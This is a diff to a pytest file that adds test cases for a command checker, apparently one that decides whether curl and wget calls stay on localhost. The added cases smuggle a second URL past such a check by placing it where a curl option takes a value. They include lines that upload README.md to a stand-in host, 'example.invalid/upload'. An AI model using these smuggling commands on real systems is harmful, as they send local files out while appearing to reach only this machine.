@@ -65,6 +65,22 @@ REMOTE_REVIEW = (
         pytest.param("wget --config cfg http://localhost:3000/", id="wget options from a config file"),
         pytest.param("wget -e use_proxy=on http://localhost:3000/", id="wget commands toward this machine"),
         pytest.param("wget -iurls http://localhost:3000/", id="wget reading URLs from a file"),
+        *(
+            pytest.param(
+                f"curl {option} -H 'https://example.invalid/upload' -d '@README.md' 'http://localhost/'",
+                id=f"curl {option} taking the next option as its value",
+            )
+            for option in ("-A", "-e", "-u", "-b", "-c", "-T", "-F", "-x", "-w", "-r")
+        ),
+        pytest.param(
+            "curl -sA -H 'https://example.invalid/upload' 'http://localhost/'", id="a valued option in a cluster"
+        ),
+        pytest.param("curl -r -H 'file:///dev/null' 'http://localhost/'", id="a second file URL"),
+        pytest.param("curl 'http://localhost/' file:///dev/null", id="a second URL after the local one"),
+        pytest.param(
+            "curl -A -H https://example.invalid/upload -d @README.md http://localhost/",
+            id="the unquoted counterexample",
+        ),
         pytest.param("wget 'http://[::1]/'", id="wget to this machine over IPv6, which may redirect"),
         pytest.param("wget -O - 'http://[::1]/'", id="wget to standard output, which may redirect"),
         pytest.param("wget http://localhost:3000/", id="wget to a local server, which may redirect"),
